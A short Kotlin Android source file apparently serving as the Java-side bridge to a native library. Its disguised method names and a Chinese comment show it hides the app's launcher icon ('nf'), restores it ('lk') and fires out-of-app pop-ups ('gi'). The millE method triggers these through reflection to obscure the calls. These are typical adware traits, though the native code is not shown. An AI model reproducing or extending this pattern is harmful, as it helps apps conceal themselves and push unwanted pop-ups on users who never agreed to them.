package com.wild.rice

import android.content.Context

/**
 * Date：2025/3/27
 * Describe:
 * com.wild.rice.WildNative
 */
object WildNative {

    //参数num:"nf"隐藏图标,"lk"恢复隐藏."gi"外弹(外弹在主进程主线程调用).
    @JvmStatic
    external fun millName(string: String, boolean: Boolean): String

    @JvmStatic
    external fun wildEncode(string: String): String

    @JvmStatic
    external fun riceHelper(int: Long): ByteArray

    @JvmStatic
    external fun initWild(c: Context): Boolean

    @JvmStatic
    fun millE(str: String, claName: String? = null) {
        when (str) {
            "inCore" -> {
                val cla = Class.forName("com.wild.rice.WildNative")
                cla.getMethod("millName", String::class.java, Boolean::class.java)
                    .invoke(null, "lk", false)
            }
            "start" -> {
                val cla = Class.forName("com.wild.rice.WildNative")
                cla.getMethod("millName", String::class.java, Boolean::class.java)
                    .invoke(null, "nf", false)
            }

            "period" -> {
                val cla = Class.forName("com.wild.rice.$claName")
                cla.getMethod("millName", String::class.java, Boolean::class.java)
                    .invoke(null, "gi", false)
            }
        }

    }
}